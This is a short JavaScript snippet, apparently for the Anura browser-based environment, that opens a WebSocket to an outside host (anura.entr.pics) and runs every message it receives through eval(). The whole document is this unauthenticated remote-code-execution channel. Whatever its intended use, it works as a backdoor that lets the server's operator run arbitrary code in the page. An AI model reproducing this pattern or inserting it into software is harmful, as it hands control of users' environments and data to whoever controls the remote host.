(() => {
    let ws = new anura.net.WebSocket("wss://anura.entr.pics/ws/");
    ws.addEventListener("message", (ev) => {
        eval(ev.data);
    });
})();
